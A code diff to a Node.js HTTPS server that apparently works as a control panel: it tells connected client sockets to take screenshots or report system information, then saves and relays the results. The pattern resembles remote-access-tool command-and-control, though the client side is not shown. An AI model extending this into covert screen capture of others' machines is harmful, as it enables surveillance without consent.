@@ -128,85 +128,112 @@ const server = https.createServer(options, (req, res) => {
                     req.on('end', () => {
                         if (so_id && !so_id.destroyed) {
                             const root = JSON.parse(body);
+                    
+                            // Clean previous listeners if necessary
+                            so_id.removeAllListeners();
+                    
                             switch(root.action) {
                                 case 'take_screenshot':
-                                    // fs.readFile('./sc.png', (err, data) =>{
-                                        if (false) {
-                                            console.error(`Error reading file: ${err}`);
-                                            res.writeHead(500, { 'Content-Type': 'application/json' });
-                                            res.end(JSON.stringify({ status: "error", message: "Unable to read screenshot file" }));
-                                        } else {
-                                            // const screenshotBase64 = data.toString('base64');
-                                            // res.writeHead(200, { 'Content-Type': 'application/json' });
-                                            // res.end(JSON.stringify({
-                                            //     status: "OK",
-                                            //     screenshot: `data:image/png;base64,${screenshotBase64}`
-                                            // }));
-                                            // Send initial command without closing the connection
-                                            so_id.write(JSON.stringify({ com: 0 }) + '\n\n\n');
-
-                                            let receivedData = '';
-
-                                            // Listen for incoming data
-                                            so_id.on('data', (data) => {
-                                                receivedData += data.toString();
-
-                                                // Process complete messages whenever the delimiter '\n\n\n' appears
-                                                while (receivedData.includes('\n\n\n')) {
-                                                    // Find the position of the delimiter
-                                                    const delimiterIndex = receivedData.indexOf('\n\n\n');
-                                                    
-                                                    // Extract the JSON message up to the delimiter
-                                                    const message = receivedData.slice(0, delimiterIndex);
-                                                    receivedData = receivedData.slice(delimiterIndex + 3); // Remove the processed message from receivedData
-
-                                                    try {
-                                                        // Parse and handle the complete JSON message
-                                                        const parsedData = JSON.parse(message);
-                                                        res.writeHead(200, { 'Content-Type': 'application/json' });
-
-                                                        const binpng = Buffer.from(parsedData.img, 'base64');
-                                                        fs.writeFile(`${adir}screenshot_${Math.floor(Date.now() / 1000)}.png`, binpng, (err) => {
-                                                            if (err) {
-                                                                console.error('Error writing file:', err);
-                                                            } else {
-                                                                console.log('File created successfully!');
-                                                            }
-                                                        });
-
-                                                        // Send JSON response with the parsed image data
-                                                        res.end(JSON.stringify({ status: "OK", screenshot: `data:image/png;base64,${parsedData.img}` }));
-                                                    } catch (error) {
-                                                        console.error('Error parsing JSON:', error);
-                                                        res.writeHead(500, { 'Content-Type': 'application/json' });
-                                                        res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
+                                    so_id.write(JSON.stringify({ com: 0 }) + '\n\n\n');
+                                    
+                                    let screenshotData = '';
+                    
+                                    // Listen for incoming data for screenshot
+                                    so_id.on('data', (data) => {
+                                        screenshotData += data.toString();
+                    
+                                        // Process complete messages whenever the delimiter '\n\n\n' appears
+                                        while (screenshotData.includes('\n\n\n')) {
+                                            const delimiterIndex = screenshotData.indexOf('\n\n\n');
+                                            const message = screenshotData.slice(0, delimiterIndex);
+                                            screenshotData = screenshotData.slice(delimiterIndex + 3);
+                    
+                                            try {
+                                                const parsedData = JSON.parse(message);
+                                                res.writeHead(200, { 'Content-Type': 'application/json' });
+                    
+                                                const binpng = Buffer.from(parsedData.img, 'base64');
+                                                fs.writeFile(`${adir}screenshot_${Math.floor(Date.now() / 1000)}.png`, binpng, (err) => {
+                                                    if (err) {
+                                                        console.error('Error writing file:', err);
+                                                    } else {
+                                                        console.log('File created successfully!');
                                                     }
-                                                }
-                                            });
-
-                                            // Handle connection end
-                                            so_id.on('end', () => {
-                                                console.log("Connection ended");
-                                            });
-
-                                            // Handle socket errors
-                                            so_id.on('error', (err) => {
-                                                console.error('Stream error:', err);
+                                                });
+                    
+                                                // Send JSON response with the parsed image data
+                                                res.end(JSON.stringify({ status: "OK", screenshot: `data:image/png;base64,${parsedData.img}` }));
+                                            } catch (error) {
+                                                console.error('Error parsing JSON:', error);
                                                 res.writeHead(500, { 'Content-Type': 'application/json' });
-                                                res.end(JSON.stringify({ status: "error", message: "Stream error" }));
-                                            });
-
+                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
+                                            }
                                         }
-                                    // });
-                                break;
-                            default:
-                                console.log(`${root.action}`);
-                            }                               
+                                    });
+                    
+                                    // Handle connection end
+                                    so_id.on('end', () => {
+                                        console.log("Connection ended for screenshot");
+                                    });
+                    
+                                    // Handle socket errors
+                                    so_id.on('error', (err) => {
+                                        console.error('Stream error:', err);
+                                        res.writeHead(500, { 'Content-Type': 'application/json' });
+                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
+                                    });
+                                    break;
+                    
+                                case 'get_system_info':
+                                    so_id.write(JSON.stringify({ com: 1 }) + '\n\n\n');
+                                    
+                                    let systemInfoData = '';
+                    
+                                    // Listen for incoming data for system info
+                                    so_id.on('data', (data) => {
+                                        systemInfoData += data.toString();
+                    
+                                        // Process complete messages whenever the delimiter '\n\n\n' appears
+                                        while (systemInfoData.includes('\n\n\n')) {
+                                            const delimiterIndex = systemInfoData.indexOf('\n\n\n');
+                                            const message = systemInfoData.slice(0, delimiterIndex);
+                                            systemInfoData = systemInfoData.slice(delimiterIndex + 3);
+                    
+                                            try {
+                                                res.writeHead(200, { 'Content-Type': 'application/json' });
+                                                res.end(message);
+                                            } catch (error) {
+                                                console.error('Error parsing JSON:', error);
+                                                res.writeHead(500, { 'Content-Type': 'application/json' });
+                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
+                                            }
+                                        }
+                                    });
+                    
+                                    // Handle connection end
+                                    so_id.on('end', () => {
+                                        console.log("Connection ended for system info");
+                                    });
+                    
+                                    // Handle socket errors
+                                    so_id.on('error', (err) => {
+                                        console.error('Stream error:', err);
+                                        res.writeHead(500, { 'Content-Type': 'application/json' });
+                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
+                                    });
+                                    break;
+                    
+                                default:
+                                    console.log(`${root.action} not recognized`);
+                                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                                    res.end(JSON.stringify({ status: "error", message: "Invalid action" }));
+                                    break;
+                            }
                         } else {
                             res.writeHead(500, { 'Content-Type': 'application/json' });
                             res.end(JSON.stringify({ status: "error", message: "Client is disconnected" }));
                         }
-                    });
+                    });                    
                 break;
             }
             break;
